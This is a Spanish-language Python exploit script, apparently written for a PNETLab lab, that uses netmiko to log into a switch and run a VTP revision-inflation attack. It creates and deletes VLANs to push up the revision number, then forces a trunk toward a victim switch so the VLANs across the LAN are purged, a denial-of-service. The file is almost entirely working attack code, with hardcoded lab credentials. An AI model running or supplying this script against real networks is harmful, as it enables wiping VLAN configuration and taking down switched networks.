#!/usr/bin/env python3
"""
MÓDULO DE EXPLOITACIÓN LAN: Ataque por Inflado de Revisión y Purga de VLANs
Ruta recomendada: /exploits/vtp_attack_exploit.py
"""

from netmiko import ConnectHandler, NetmikoAuthenticationException, NetmikoTimeoutException

# Parámetros de conexión para el Switch Atacante en PNETLab
SW_ATACANTE_PERFIL = {
    "device_type": "cisco_ios",
    "host": "202.121.66.50",  # Cambiar por la IP de administración de tu nodo atacante
    "username": "admin",
    "password": "PasswordLaboratorio123",
    "secret": "PasswordLaboratorio123",
}

# Secuencia de comandos para forzar el ataque DoS
COMANDOS_ATAQUE = [
    "hostname SW-Atacante",
    "vtp domain ITLA-NET",
    "vtp mode server",
    "vtp version 2",
    
    # Ráfaga transaccional para forzar un número de revisión muy elevado
    "vlan 900", "exit", "no vlan 900", "exit",
    "vlan 901", "exit", "no vlan 901", "exit",
    "vlan 902", "exit", "no vlan 902", "exit",
    
    # Inyección de la trama vacía (purga masiva)
    "vlan 666", "name VLAN-Maliciosa", "exit",
    "no vlan 666", "exit",
    
    # Negociación forzada del enlace troncal hacia la víctima
    "interface ethernet 0/0",
    "description => VECTOR DE ATAQUE LAN - ENLACE TRONCAL FORZADO <=",
    "switchport trunk encapsulation dot1q",
    "switchport mode trunk",
    "switchport nonegotiate",
    "no shutdown"
]

def lanzar_ataque():
    print(f"[*] Inicializando vector de ataque en SW-Atacante ({SW_ATACANTE_PERFIL['host']})...")
    try:
        with ConnectHandler(**SW_ATACANTE_PERFIL) as net_connect:
            net_connect.enable()
            print("[!] Conexión exitosa. Ejecutando ráfaga de inflado VTP...")
            
            output = net_connect.send_config_set(COMANDOS_ATAQUE)
            print(output)
            
            net_connect.send_command("write memory")
            print("[+] Explotación desplegada. Tramas de purga enviadas a la LAN.")
            
    except (NetmikoTimeoutException, NetmikoAuthenticationException) as e:
        print(f"[-] Error crítico al conectar con el Switch Atacante: {e}")

if __name__ == "__main__":
    lanzar_ataque()